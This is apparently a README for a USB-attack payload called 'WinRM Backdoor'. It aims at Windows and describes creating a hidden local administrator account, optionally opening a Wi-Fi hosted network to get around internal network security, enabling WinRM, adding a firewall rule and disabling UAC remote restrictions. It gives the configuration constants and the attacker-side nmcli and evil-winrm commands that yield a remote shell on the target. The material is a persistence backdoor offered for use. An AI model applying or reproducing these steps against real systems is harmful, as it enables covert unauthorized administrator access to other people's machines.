# "Microsoft Windows" WinRM Backdoor

- Title:         "Microsoft Windows" WinRM Backdoor
- Author:        TW-D
- Version:       1.0
- Target:        Microsoft Windows
- Category:      Remote Access

## Description

1) Adds a user account.
2) Adds this local user to local administrator group.
3) If the target computer is equipped with a compatible Wi-Fi card :
    Avoids security measures on the internal network with the 
    creation of a wireless "Hosted Network".
4) Enables "Windows Remote Management" with default settings.
5) Adds a rule to the firewall.
6) Sets a value to "LocalAccountTokenFilterPolicy" to disable "UAC" remote restrictions.
7) Hides user account.

## Configuration

From "payload.txt" change the values of the following constants :
```bash

######## INITIALIZATION ########

readonly WINDOWS_USERNAME="BB_User"
readonly WINDOWS_PASSWORD="BB_P@ssW0rD"

##
# (any) Administrators
# (fr) Administrateurs
##
readonly GROUP_NAME="Administrators"

##
# Can be set to "true" if the target computer 
# is equipped with a compatible Wi-Fi card.
##
readonly WIRELESS_HOTSPOT="false"
readonly HOTSPOT_NAME="BB_HOTSPOT"

```

## Exploitation

>
> The name of the access point and the security key will be those defined by the values of the constants : **HOTSPOT_NAME** and **WINDOWS_PASSWORD**.
>

```
hacker@hacker-computer:~$ nmcli dev wifi connect "<HOTSPOT_NAME>" password "<WINDOWS_PASSWORD>"
```

>
> The connection identifiers will be those defined by the values of the constants : **WINDOWS_USERNAME** and **WINDOWS_PASSWORD**.
>

```
hacker@hacker-computer:~$ evil-winrm --ip <TARGET> --user <WINDOWS_USERNAME> --password '<WINDOWS_PASSWORD>'
*Evil-WinRM* PS C:\Users\<WINDOWS_USERNAME>\Documents> whoami
desktop-xxxxxxx\<WINDOWS_USERNAME>
```
